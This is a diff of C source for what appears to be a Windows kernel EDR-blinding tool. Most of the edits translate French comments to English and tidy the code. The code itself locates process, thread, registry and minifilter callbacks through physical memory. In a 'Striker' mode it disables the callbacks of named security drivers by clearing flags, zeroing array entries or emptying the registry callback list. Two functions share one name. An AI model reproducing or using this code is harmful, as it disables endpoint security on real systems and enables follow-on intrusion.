@@ -15,6 +15,7 @@ BOOL IsEDR(CHAR* name) {
     return FALSE;
 }
 
+// Reads a 64-bit little-endian value from the mapped physical memory window.
 UINT64 ReadMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 mapSize)
 {
     if (physicalAddress + 8 > mapSize)
@@ -27,6 +28,7 @@ UINT64 ReadMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 mapSize)
     return v;
 }
 
+// Writes a 64-bit little-endian value into the mapped physical memory window.
 VOID WriteMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 value, UINT64 mapSize)
 {
    
@@ -40,6 +42,7 @@ VOID WriteMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 value, UINT64 mapS
     }
 }
 
+// Translates a kernel virtual address to a physical address by walking x64 page tables.
 UINT64 VirtualToPhysical(UINT64 cr3, UINT64 virtualAddr, BYTE* map, UINT64 mapSize)
 {
     UINT64 PML4 = (virtualAddr >> 39) & 0x1FF;
@@ -100,16 +103,16 @@ UINT64 GetModuleBase(const char* moduleName) {
     DWORD cbNeeded;
     int cDrivers, i;
 
-    // Getting drivers list to load
+    // Enumerate loaded kernel modules.
     if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
         char szDriver[1024];
         cDrivers = cbNeeded / sizeof(drivers[0]);
 
         for (i = 0; i < cDrivers; i++) {
-            // Getting name of each driver
+            // Resolve the base name for each loaded module.
             if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver))) {
                 if (_stricmp(szDriver, moduleName) == 0) {
-                    // Returning address drivers
+                    // Return the kernel base address for the matching module.
                     return (UINT64)drivers[i];
                 }
             }
@@ -213,14 +216,14 @@ VOID DisplayNotifyCallbacksDrivers(UINT64 notifyCallbackAddr, UINT64 cr3, BYTE* 
 VOID DisplayObCallbacks(UINT64 pObjectTypeVA, UINT64 cr3, BYTE* phys, UINT64 physSize, const char* typeName) {
     printf("\n[!] Analysis of ObCallbacks for %s (VA: 0x%llx)\n", typeName, pObjectTypeVA);
 
-    // Lire l'adresse physique du pointeur exporté
+    // Translate the exported pointer address.
     UINT64 pExportPhys = VirtualToPhysical(cr3, pObjectTypeVA, phys, physSize);
     if (!pExportPhys) {
         printf("[!] Failed to translate Export VA to Physical\n");
         return;
     }
 
-    // LIRE le contenu du pointeur pour avoir l'adresse de la structure _OBJECT_TYPE
+    // Read the exported pointer to recover the _OBJECT_TYPE structure address.
     UINT64 objectTypeStructVA = ReadMemoryU64(phys, pExportPhys, physSize);
     if (objectTypeStructVA < 0xFFFF000000000000) {
         printf("[!] Invalid ObjectType Structure VA: 0x%llx\n", objectTypeStructVA);
@@ -228,7 +231,7 @@ VOID DisplayObCallbacks(UINT64 pObjectTypeVA, UINT64 cr3, BYTE* phys, UINT64 phy
     }
     printf("[+] %s Structure found at VA: 0x%llx\n", typeName, objectTypeStructVA);
 
-    // Accéder à la CallbackList (Offset 0xC8)
+    // Reach the CallbackList field. The offset is version-sensitive.
     UINT64 callbackListHeadVA = objectTypeStructVA + 0xC8;
     UINT64 listHeadPhys = VirtualToPhysical(cr3, callbackListHeadVA, phys, physSize);
     if (!listHeadPhys) return;
@@ -240,16 +243,15 @@ VOID DisplayObCallbacks(UINT64 pObjectTypeVA, UINT64 cr3, BYTE* phys, UINT64 phy
         UINT64 entryPhys = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!entryPhys) break;
 
-        // IMPORTANT : Dans les versions récentes, le LIST_ENTRY est à l'offset 0x0
-        // de la structure _OB_CALLBACK_ENTRY.
-        // L'élément 'Item' (pointeur vers _OB_CALLBACK_ENTRY_ITEM) est à l'offset 0x20.
+        // On recent builds, LIST_ENTRY is usually at offset 0x0 in _OB_CALLBACK_ENTRY.
+        // The Item pointer, which references _OB_CALLBACK_ENTRY_ITEM, is expected at 0x20.
 
         UINT64 callbackItemVA = ReadMemoryU64(phys, entryPhys + 0x20, physSize);
 
         if (callbackItemVA > 0xFFFF000000000000) {
             UINT64 itemPhys = VirtualToPhysical(cr3, callbackItemVA, phys, physSize);
             if (itemPhys) {
-                // PreOperation est à l'offset 0x28 dans _OB_CALLBACK_ENTRY_ITEM
+                // PreOperation is expected at offset 0x28 in _OB_CALLBACK_ENTRY_ITEM.
                 UINT64 preNotify = ReadMemoryU64(phys, itemPhys + 0x28, physSize);
 
                 if (preNotify > 0xFFFF000000000000) {
@@ -259,7 +261,7 @@ VOID DisplayObCallbacks(UINT64 pObjectTypeVA, UINT64 cr3, BYTE* phys, UINT64 phy
             }
         }
 
-        // On passe au Flink suivant
+        // Move to the next Flink.
         currentEntryVA = ReadMemoryU64(phys, entryPhys, physSize);
         count++;
     }
@@ -320,7 +322,7 @@ UINT64 GetFuncAddr(HMODULE hNtos, UINT64 kernelBase, CHAR* FuncName) {
 INT64 GetMinifilterFuncAddress(const char* ModuleName, const CHAR* FuncName) {
     UINT64 KBase = GetModuleBase(ModuleName);
     if (!KBase) {
-        printf("[-] Base introuvable pour %s\n", ModuleName);
+        printf("[-] Base not found for %s\n", ModuleName);
         return 0;
     }
 
@@ -328,13 +330,13 @@ INT64 GetMinifilterFuncAddress(const char* ModuleName, const CHAR* FuncName) {
     CHAR sysDir[MAX_PATH];
     GetSystemDirectoryA(sysDir, MAX_PATH);
 
-    // Déterminer le chemin selon le type de module
+    // Resolve the on-disk path depending on the module type.
     if (_stricmp(ModuleName, "ntoskrnl.exe") == 0 ||
         _stricmp(ModuleName, "ntkrnlmp.exe") == 0) {
         snprintf(FullPath, MAX_PATH, "%s\\%s", sysDir, ModuleName);
     }
     else {
-        // Drivers (fltmgr.sys, etc.)
+        // Kernel drivers such as fltmgr.sys live under System32\drivers.
         snprintf(FullPath, MAX_PATH, "%s\\drivers\\%s", sysDir, ModuleName);
     }
 
@@ -346,7 +348,7 @@ INT64 GetMinifilterFuncAddress(const char* ModuleName, const CHAR* FuncName) {
 
     FARPROC funcAddr = GetProcAddress(hMod, FuncName);
     if (!funcAddr) {
-        printf("[-] Export '%s' introuvable\n", FuncName);
+        printf("[-] Export '%s' not found\n", FuncName);
         FreeLibrary(hMod);
         return 0;
     }
@@ -363,12 +365,12 @@ INT64 GetMinifilterFuncAddress(const char* ModuleName, const CHAR* FuncName) {
 
 
 UINT64 GetObjectTypeAddrByScan(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize, int flag) {
-    // Déterminer la fonction "donneuse"
+    // Select an exported routine that references the target object type pointer.
     const char* funcName = (flag == 1) ? "NtDuplicateObject" : "NtOpenThreadTokenEx";
     UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)funcName);
     if (!funcVA) return 0;
 
-    // Scanner les instructions (on cherche l'opcode 4C 8B 05)
+    // Scan the function body for the MOV R8, [RIP+disp32] pattern.
     BYTE buffer[3];
     UINT64 targetInstrVA = 0;
 
@@ -377,7 +379,7 @@ UINT64 GetObjectTypeAddrByScan(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYT
         UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
         if (!pa) continue;
 
-        // Lecture de 3 octets pour vérifier le pattern
+        // Read the opcode bytes used for pattern validation.
         for (int j = 0; j < 3; j++) buffer[j] = phys[pa + j];
 
         if (buffer[0] == 0x4C && buffer[1] == 0x8B && buffer[2] == 0x05) {
@@ -388,15 +390,14 @@ UINT64 GetObjectTypeAddrByScan(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYT
 
     if (!targetInstrVA) return 0;
 
-    // Extraire l'offset (4 octets après l'opcode)
+    // Extract the RIP-relative displacement.
     UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
     INT32 relativeOffset = *(INT32*)(&phys[paOffset]);
 
-    // Calculer la VA du pointeur (RIP-relative : InstrAddr + InstrLen + Offset)
-    // L'instruction MOV R8, [RIP+offset] fait 7 octets
+    // Compute the pointer VA. The MOV R8, [RIP+disp32] instruction is 7 bytes long.
     UINT64 pointerVA = targetInstrVA + 7 + relativeOffset;
 
-    // Lire le contenu du pointeur pour avoir l'adresse de la structure _OBJECT_TYPE
+    // Dereference the pointer to get the _OBJECT_TYPE structure address.
     UINT64 paPointer = VirtualToPhysical(cr3, pointerVA, phys, physSize);
     return ReadMemoryU64(phys, paPointer, physSize);
 }
@@ -406,7 +407,7 @@ VOID AuditObRegisterCallbacks(UINT64 objectTypeVA, UINT64 cr3, BYTE* phys, UINT6
     UINT64 paListHead = VirtualToPhysical(cr3, listHeadVA, phys, physSize);
     if (!paListHead) return;
 
-    // Premier maillon (Flink)
+    // Read the first list entry through Flink.
     UINT64 currentEntryVA = ReadMemoryU64(phys, paListHead, physSize);
 
     int count = 0;
@@ -414,35 +415,34 @@ VOID AuditObRegisterCallbacks(UINT64 objectTypeVA, UINT64 cr3, BYTE* phys, UINT6
         UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!paEntry) break;
 
-        // Validation : L'offset +0x20 doit pointer vers le parent (PsProcessType/PsThreadType)
+        // Validate that the entry belongs to the expected object type.
         UINT64 parentTypeVA = ReadMemoryU64(phys, paEntry + 0x20, physSize);
         if (parentTypeVA != objectTypeVA) {
-            // Si on n'est pas aligné, on ne traite pas pour éviter un BSOD
+            // Skip unexpected layouts to avoid corrupting unrelated kernel memory.
             currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
             continue;
         }
 
-        // Lecture du statut Enabled (Offset +0x14)
-        // Note: C'est un BOOL (4 octets), on peut lire le DWORD complet
+        // Read the Enabled flag. It is treated as a 4-byte BOOL on this target build.
         DWORD enabled = *(DWORD*)(&phys[paEntry + 0x14]);
 
-        // Récupération de la fonction PreOperation (Offset +0x28)
+        // Recover the PreOperation callback pointer.
         UINT64 preOpVA = ReadMemoryU64(phys, paEntry + 0x28, physSize);
 
         if (preOpVA > 0xFFFF000000000000) {
             CHAR* drvName = GetDriverName(preOpVA);
 
-            printf(" %t [%d] Status: %s | Driver: [%-15s] | PreOp: 0x%llx\n",
+            printf("   [%d] Status: %s | Driver: [%-15s] | PreOp: 0x%llx\n",
                 count,
                 enabled ? "ENABLED " : "DISABLED",
                 drvName ? drvName : "Unknown",
                 preOpVA);
 
             if (flag == 1) {
-                // Mode Striker : Neutralisation par le flag au lieu du unlinking
+                // Striker mode can disable a callback by clearing its Enabled flag.
                 if (IsEDR(drvName) && enabled) {
                     printf("      [!] EDR detected. Disabling callback via flag...\n");
-                    // On écrit 0 (FALSE) à l'adresse physique du flag Enabled (+0x14)
+                    // Write FALSE to the physical address backing the Enabled flag.
                     *(DWORD*)(&phys[paEntry + 0x14]) = 0;
                     printf("      [+] Success: Callback blinded.\n");
                 }
@@ -451,7 +451,7 @@ VOID AuditObRegisterCallbacks(UINT64 objectTypeVA, UINT64 cr3, BYTE* phys, UINT6
             if (drvName) free(drvName);
         }
 
-        // Passage au maillon suivant (Flink à +0x00)
+        // Move to the next list entry through Flink.
         currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
         count++;
     }
@@ -473,18 +473,18 @@ VOID RemoveObRegisterCallbacks(UINT64 objectTypeStructVA, UINT64 cr3, BYTE* phys
         UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!paEntry) break;
 
-        // TENTATIVE : Sur les builds récents, l'objet CallbackEntryItem est souvent à +0x18
-        // On va essayer de lire l'item à +0x18 ET +0x20 pour voir lequel contient une adresse valide
+        // On recent builds, CallbackEntryItem is often found at +0x18.
+        // Try +0x18 first, then +0x20, and keep whichever looks like a valid kernel VA.
         UINT64 itemPtrVA = ReadMemoryU64(phys, paEntry + 0x18, physSize);
 
-        // Si l'adresse lue à +0x18 ne ressemble pas à du noyau, on tente +0x20
+        // If +0x18 does not look like a kernel address, try the alternate +0x20 layout.
         if (itemPtrVA < 0xFFFF000000000000) {
             itemPtrVA = ReadMemoryU64(phys, paEntry + 0x20, physSize);
         }
 
         UINT64 paItem = VirtualToPhysical(cr3, itemPtrVA, phys, physSize);
         if (paItem) {
-            // Dans l'item : PreOperation (+0x28)
+            // Inside the item, PreOperation is expected at +0x28.
             UINT64 preOpVA = ReadMemoryU64(phys, paItem + 0x28, physSize);
 
             if (preOpVA > 0xFFFF000000000000) {
@@ -493,7 +493,7 @@ VOID RemoveObRegisterCallbacks(UINT64 objectTypeStructVA, UINT64 cr3, BYTE* phys
                 if (drvName) free(drvName);
             }
             else {
-                // Si ça échoue encore, on affiche la valeur brute de l'item pour debugger
+                // If decoding still fails, print the raw item pointer for debugging.
                 printf("  |-- [%d] Item VA: 0x%llx (PreOp lue: 0x%llx)\n", count, itemPtrVA, preOpVA);
             }
         }
@@ -515,7 +515,7 @@ VOID DisplayObCallbacksFromStruct(UINT64 structVA, UINT64 cr3, BYTE* phys, UINT6
         UINT64 entryPA = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!entryPA) break;
 
-        // Item à l'offset +0x20
+        // Item pointer at offset +0x20.
         UINT64 itemVA = ReadMemoryU64(phys, entryPA + 0x20, physSize);
         UINT64 itemPA = VirtualToPhysical(cr3, itemVA, phys, physSize);
 
@@ -538,7 +538,7 @@ VOID StrikerByBlacklist(UINT64 arrayVA, UINT64 cr3, BYTE* phys, UINT64 physSize,
         UINT64 entry = ReadMemoryU64(phys, arrayPhys + (j * 8), physSize);
         if (entry == 0) continue;
 
-        // Extraction de l'adresse de la fonction (comme dans ton DisplayNotifyDrivers)
+        // Extract the callback function address as done in DisplayNotifyCallbacksDrivers.
         UINT64 blockVA = entry & ~0xFULL;
         UINT64 blockPhys = VirtualToPhysical(cr3, blockVA, phys, physSize);
         if (blockPhys == 0) continue;
@@ -548,15 +548,15 @@ VOID StrikerByBlacklist(UINT64 arrayVA, UINT64 cr3, BYTE* phys, UINT64 physSize,
             callbackFn = ReadMemoryU64(phys, blockPhys, physSize);
         }
 
-        // Identifier le driver
+        // Resolve the owning driver name.
         CHAR* driverName = GetDriverName(callbackFn);
         if (driverName != NULL) {
-            // Vérifier si le driver est dans la liste noire
+            // Check whether the driver is in the configured target list.
             for (int i = 0; i < blacklistCount; i++) {
                 if (_stricmp(driverName, blacklist[i]) == 0) {
                     printf("[!] TARGET FOUND: %s at index [%d]. Neutralization...\n", driverName, j);
 
-                    // PATCH : On met l'entrée du tableau à zéro
+                    // Clear the callback array entry.
                     WriteMemoryU64(phys, arrayPhys + (j * 8), 0, physSize);
 
                     printf("[+] %s was successfully blinded.\n", driverName);
@@ -570,11 +570,11 @@ VOID StrikerByBlacklist(UINT64 arrayVA, UINT64 cr3, BYTE* phys, UINT64 physSize,
 VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize, BOOL strikerMode) {
     printf("\n[!] Analysis of Registry Callbacks (Configuration Manager)\n");
 
-    // 1. Trouver l'adresse de CmUnRegisterCallback (notre donneur de signature)
+    // Resolve CmUnRegisterCallback, used here as the signature donor.
     UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)"CmUnRegisterCallback");
     if (!funcVA) return;
 
-    // 2. Scanner pour le pattern LEA RCX, [CmpCallbackListHead] (48 8d 0d)
+    // Scan for LEA RCX, [CmpCallbackListHead] (48 8d 0d).
     UINT64 targetInstrVA = 0;
     for (int i = 0; i < 400; i++) {
         UINT64 currentVA = funcVA + i;
@@ -583,7 +583,7 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
 
         // Pattern: 48 8d 0d (LEA RCX, [RIP + offset])
         if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && phys[pa + 2] == 0x0D) {
-            // Optionnel : vérification du contexte pour plus de précision (48 8d 54)
+            // Optional context check for higher precision (48 8d 54).
             UINT64 prevPA = VirtualToPhysical(cr3, currentVA - 5, phys, physSize);
             if (prevPA && phys[prevPA] == 0x48 && phys[prevPA + 1] == 0x8D && phys[prevPA + 2] == 0x54) {
                 targetInstrVA = currentVA;
@@ -597,12 +597,12 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
         return;
     }
 
-    // 3. Calculer la VA de la tête de liste (CmpCallbackListHead)
+    // Compute the CmpCallbackListHead virtual address.
     UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
     INT32 displacement = *(INT32*)(&phys[paOffset]);
     UINT64 callbackListHeadPtrVA = targetInstrVA + 7 + displacement;
 
-    // 4. Parcourir et Afficher les abonnés
+    // Walk and display registered callback subscribers.
     UINT64 paListHead = VirtualToPhysical(cr3, callbackListHeadPtrVA, phys, physSize);
     UINT64 currentEntryVA = ReadMemoryU64(phys, paListHead, physSize);
     UINT64 firstEntryVA = currentEntryVA;
@@ -621,25 +621,25 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
         UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!paEntry) break;
 
-        // L'adresse de la fonction est à l'offset 0x28 (Structure _CM_CALLBACK_CONTEXT_BLOCK)
+        // The callback function is expected at offset 0x28 in _CM_CALLBACK_CONTEXT_BLOCK.
         UINT64 callBackFuncAddr = ReadMemoryU64(phys, paEntry + 0x28, physSize);
         CHAR* drvName = GetDriverName(callBackFuncAddr);
 
         printf(" [%d] 0x%llx => [%s]\n", count, callBackFuncAddr, drvName ? drvName : "Unknown");
         if (drvName) free(drvName);
 
-        // Passer au suivant (Flink est à l'offset 0x0)
+        // Move to the next entry. Flink is at offset 0x0.
         currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
         count++;
 
     } while (currentEntryVA != 0 && currentEntryVA != firstEntryVA && count < 32);
 
-    // 5. Phase de Neutralisation (uniquement si Striker Mode est activé)
+    // Neutralization phase, only when Striker mode is enabled.
     if (strikerMode) {
         printf("\n[!] STRIKER: Clearing all registry callbacks...\n");
-        // On fait pointer la tête de liste sur elle-même pour vider la liste proprement
+        // Make the list head point to itself to detach the list.
         WriteMemoryU64(phys, paListHead, callbackListHeadPtrVA, physSize);
-        // Note: Idéalement, il faut aussi mettre à jour le Blink (ListHead + 8)
+        // Keep Blink consistent with the self-referencing list head.
         WriteMemoryU64(phys, paListHead + 8, callbackListHeadPtrVA, physSize);
         printf("[+] CmpCallbackListHead successfully reset.\n");
     }
@@ -648,11 +648,11 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
 VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
     printf("\n[!] Analysis of Registry Callbacks (CallbackListHead)\n");
 
-    // 1. Trouver l'adresse de CmUnRegisterCallback
+    // Resolve CmUnRegisterCallback.
     UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)"CmUnRegisterCallback");
     if (!funcVA) return;
 
-    // 2. Scanner pour le pattern LEA RCX, [CmpCallbackListHead] (48 8d 0d)
+    // Scan for LEA RCX, [CmpCallbackListHead] (48 8d 0d).
     UINT64 targetInstrVA = 0;
     BYTE buffer[3];
     for (int i = 0; i < 300; i++) {
@@ -665,7 +665,7 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
         buffer[2] = phys[pa + 2];
 
         if (buffer[0] == 0x48 && buffer[1] == 0x8D && buffer[2] == 0x0D) {
-            // Vérification du contexte précédent (48 8d 54)
+            // Validate the preceding instruction context (48 8d 54).
             UINT64 prevPA = VirtualToPhysical(cr3, currentVA - 5, phys, physSize);
             if (prevPA && phys[prevPA] == 0x48 && phys[prevPA + 1] == 0x8D && phys[prevPA + 2] == 0x54) {
                 targetInstrVA = currentVA;
@@ -679,12 +679,12 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
         return;
     }
 
-    // 3. Calculer la VA de CallbackListHead (RIP-relative)
+    // Compute CallbackListHead through RIP-relative addressing.
     UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
     INT32 displacement = *(INT32*)(&phys[paOffset]);
     UINT64 callbackListHeadPtrVA = targetInstrVA + 7 + displacement;
 
-    // 4. Parcourir la liste chaînée
+    // Walk the linked list.
     UINT64 paListHeadPtr = VirtualToPhysical(cr3, callbackListHeadPtrVA, phys, physSize);
     UINT64 currentEntryVA = ReadMemoryU64(phys, paListHeadPtr, physSize);
     UINT64 firstEntryVA = currentEntryVA;
@@ -698,49 +698,25 @@ VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE*
         UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
         if (!paEntry) break;
 
-        // L'adresse de la fonction est à l'offset 0x28 (dépend de la version, souvent 0x28 sur x64)
+        // The callback function is expected at offset 0x28 on this x64 target build.
         UINT64 callBackFuncAddr = ReadMemoryU64(phys, paEntry + 0x28, physSize);
         CHAR* drvName = GetDriverName(callBackFuncAddr);
 
         printf(" [+] Callback: 0x%llx => [%s]\n", callBackFuncAddr, drvName ? drvName : "Unknown");
         if (drvName) free(drvName);
 
-        // Passer au suivant (Flink à l'offset 0x0)
+        // Move to the next entry through Flink at offset 0x0.
         currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
 
     } while (currentEntryVA != 0 && currentEntryVA != firstEntryVA);
 
-    // 5. STRIKE : Vider la liste
-    // Pour "Clear All", on fait pointer la tête de liste sur elle-même
+    // STRIKE: clear the list by making the list head point to itself.
     WriteMemoryU64(phys, paListHeadPtr, callbackListHeadPtrVA, physSize);
     printf("\n[STRIKE] CmpCallbackListHead has been cleared (Pointed to itself).\n");
 }
 
-/*
-CHAR* GetMinifilterName(UINT64 filterVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
-    // Dans FLT_FILTER, le nom est souvent une UNICODE_STRING à l'offset 0x48 (variable selon version)
-    // On va lire le buffer de l'UNICODE_STRING
-    UINT64 nameStructVA = filterVA + 0x48;
-    UINT64 paNameStruct = VirtualToPhysical(cr3, nameStructVA, phys, physSize);
-    if (!paNameStruct) return NULL;
-
-    USHORT length = *(USHORT*)(&phys[paNameStruct]);
-    UINT64 bufferVA = ReadMemoryU64(phys, paNameStruct + 8, physSize);
-    UINT64 paBuffer = VirtualToPhysical(cr3, bufferVA, phys, physSize);
-
-    if (!paBuffer) return NULL;
-
-    // Conversion simple de WideChar vers Char pour l'affichage
-    CHAR* name = (CHAR*)malloc((length / 2) + 1);
-    for (int i = 0; i < (length / 2); i++) {
-        name[i] = (CHAR)phys[paBuffer + (i * 2)];
-    }
-    name[length / 2] = '\0';
-    return name;
-}
-*/
 CHAR* GetMinifilterName(UINT64 filterStructVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
-    // Offset confirmé par WinDbg : +0x040 Name : _UNICODE_STRING
+    // Offset confirmed with WinDbg: +0x040 Name : _UNICODE_STRING.
     UINT64 unicodeStrAddr = filterStructVA + 0x40;
 
     UINT64 paUnicode = VirtualToPhysical(cr3, unicodeStrAddr, phys, physSize);
@@ -767,7 +743,7 @@ CHAR* GetMinifilterName(UINT64 filterStructVA, UINT64 cr3, BYTE* phys, UINT64 ph
 VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
     printf("\n[!] Analysis of File System Minifilters\n");
 
-    // 1. Localiser FltGlobals via FltEnumerateFilters
+    // Locate FltGlobals through FltEnumerateFilters.
     UINT64 funcVA = GetMinifilterFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");//GetFuncAddr(hFltMgr, fltMgrBase, (CHAR*)"FltEnumerateVolumes");
     printf("[+] FltEnumerateFilters found at: 0x%llx\n", funcVA);
 
@@ -787,7 +763,7 @@ VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys
 
     if (!targetInstrVA) return;
 
-    // 2. Accès à la structure FLT_FRAME
+    // Resolve the FLT_FRAME structure.
     UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
     INT32 displacement = *(INT32*)(&phys[paOffset]);
     UINT64 framePtrVA = targetInstrVA + 7 + displacement;
@@ -795,36 +771,36 @@ VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys
 
     printf("[+] FLT_FRAME found at: 0x%llx\n", fltFrameVA);
 
-    // 3. Énumération des FILTRES (Global)
-    // Essaye d'ajuster l'offset à 0x48 directement si 0x50 ne renvoie rien
+    // Enumerate global filters.
+    // If 0x50 does not return entries on a target build, try adjusting to 0x48.
     UINT64 filterListHeadVA = fltFrameVA + 0x48;
-    // On lit le premier élément
+    // Read the first element.
     UINT64 currentFilterLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, filterListHeadVA, phys, physSize), physSize);
 
-    // IMPORTANT : Dans une LIST_ENTRY de type "Resource List", le Flink peut pointer 
-    // vers le début du Header. On ajoute une sécurité pour ne pas break trop tôt.
+    // In Resource List style LIST_ENTRY layouts, Flink can point to the header start.
+    // Keep the validation conservative to avoid stopping too early.
     printf("\n--- Registered Filters ---\n");
     for (int i = 0; i < 64; i++) {
-        // Si on retombe sur le header, c'est qu'on a fait le tour
+        // Reaching the header again means the walk is complete.
         if (currentFilterLinkVA == filterListHeadVA || currentFilterLinkVA == 0) break;
 
-        // Tentative de lecture sécurisée
+        // Conservative read attempt.
         UINT64 paFilterLink = VirtualToPhysical(cr3, currentFilterLinkVA, phys, physSize);
         if (!paFilterLink) break;
 
         UINT64 filterStructVA = currentFilterLinkVA - 0x10;
         CHAR* name = GetMinifilterName(filterStructVA, cr3, phys, physSize);
 
-        // Si le nom est NULL, c'est peut-être qu'on n'est pas sur un FLT_FILTER
-        // On l'affiche quand même pour voir si on avance dans la mémoire
+        // If the name is NULL, this may not be a FLT_FILTER.
+        // Still print the entry to help validate memory walking progress.
         printf(" [%02d] Filter: %-15s | VA: 0x%llx\n", i, name ? name : "Checking...", filterStructVA);
         if (name) free(name);
 
-        // On passe au suivant
+        // Move to the next entry.
         currentFilterLinkVA = ReadMemoryU64(phys, paFilterLink, physSize);
     }
-     // 4. Énumération des VOLUMES et de leurs INSTANCES
-    // AttachedVolumes est à +0xC8. La LIST_ENTRY est à +0xD0.
+     // Enumerate volumes and their instances.
+    // AttachedVolumes is at +0xC8. The LIST_ENTRY is at +0xD0.
     UINT64 volumeListHeadVA = fltFrameVA + 0xD0;
     UINT64 currentVolLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, volumeListHeadVA, phys, physSize), physSize);
 
@@ -834,17 +810,17 @@ VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys
         UINT64 volumeStructVA = currentVolLinkVA - 0x10;
         printf(" Volume [%d] (VA: 0x%llx)\n", volIdx, volumeStructVA);
 
-        // Les instances sont à l'offset 0x130 du Volume (Win11) ou 0x120 (Win10)
-        // On va scanner pour trouver la liste d'instances
+        // Instances are usually at volume offset 0x130 on Win11 or 0x120 on Win10.
+        // Scan the instance list conservatively.
         UINT64 instListHeadVA = volumeStructVA + 0x130;
         UINT64 currentInstLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, instListHeadVA, phys, physSize), physSize);
 
         int instIdx = 0;
         while (currentInstLinkVA != instListHeadVA && currentInstLinkVA != 0 && instIdx < 15) {
-            UINT64 instStructVA = currentInstLinkVA; // L'instance commence souvent au lien
+            UINT64 instStructVA = currentInstLinkVA; // The instance often starts at the list link.
             UINT64 paInst = VirtualToPhysical(cr3, instStructVA, phys, physSize);
 
-            // Dans FLT_INSTANCE, le pointeur vers le FILTRE est à +0x18
+            // In FLT_INSTANCE, the parent filter pointer is expected at +0x18.
             UINT64 parentFilterVA = ReadMemoryU64(phys, paInst + 0x18, physSize);
             CHAR* fName = GetMinifilterName(parentFilterVA, cr3, phys, physSize);
 
@@ -861,23 +837,22 @@ VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys
 }
 
 void RegisterFoundCallback(UINT64 nodeVA, const char* driverName, UINT64 cr3, BYTE* phys, UINT64 physSize) {
-    // 1 Vérification des doublons (pour ne pas enregistrer 10x le même callback)
+    // Avoid duplicate entries for the same callback node.
     for (int i = 0; i < NodeCount; i++) {
         if (FoundNodes[i].NodeAddress == nodeVA) return;
     }
 
-    // 2 Limite de sécurité du tableau
+    // Enforce the fixed-size tracking table limit.
     if (NodeCount >= 256) return;
 
-    // 3 Lecture des pointeurs originaux (Flink/Blink)
-    // Utile pour la validation d'intégrité avant l'unlinking
+    // Save the original Flink/Blink pointers for later integrity validation.
     UINT64 paNode = VirtualToPhysical(cr3, nodeVA, phys, physSize);
     if (!paNode) return;
 
     UINT64 flink = *(UINT64*)(&phys[paNode]);
     UINT64 blink = *(UINT64*)(&phys[paNode + 8]);
 
-    // 4 Enregistrement dans notre structure
+    // Persist the node metadata in the local tracking table.
     FoundNodes[NodeCount].NodeAddress = nodeVA;
     FoundNodes[NodeCount].OriginalFlink = flink;
     FoundNodes[NodeCount].OriginalBlink = blink;
@@ -891,7 +866,7 @@ void RegisterFoundCallback(UINT64 nodeVA, const char* driverName, UINT64 cr3, BY
 }
 
 UINT64 FindFltFrame(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
-    // 1 On cherche l'export FltEnumerateFilters dans fltmgr.sys
+    // Resolve the FltEnumerateFilters export from fltmgr.sys.
